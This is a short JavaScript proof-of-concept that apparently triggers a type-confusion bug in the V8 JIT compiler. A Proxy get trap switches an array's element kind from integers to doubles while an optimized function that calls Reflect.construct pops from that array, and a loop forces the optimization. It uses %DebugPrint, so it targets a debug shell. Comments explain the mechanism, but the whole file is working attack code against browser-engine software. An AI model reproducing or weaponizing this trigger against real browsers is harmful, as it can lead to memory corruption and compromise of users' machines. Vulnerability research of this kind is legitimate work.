let victim_arr = new Array(1);
victim_arr[0] = 1; // element size is 4-byte

let p = new Proxy(Object, {
    get(target, prop, receiver) {
        % DebugPrint(victim_arr);
        victim_arr[0] = 1.1; // element size is 8-byte
        % DebugPrint(victim_arr);
        return Reflect.get(...arguments);
    }
});

function empty() { }

function f(new_target) {
    // add JSCreate to effect chain of |victim_arr|
    // same as |victim_arr.pop()|
    return victim_arr.pop(Reflect.construct(empty, arguments, new_target));
}

function ff(new_target) {
    // if |f()| is outermost, |Reflect.construct()| is not be optimized to JSCreate
    // so wrap |f()| with |ff()|
    return f(new_target);
}

// trigger optimization
for (let i = 0; i < 0x10000; i++) { ff(empty); }

console.log(`[+] ff(p) == ${ff(p)}`);
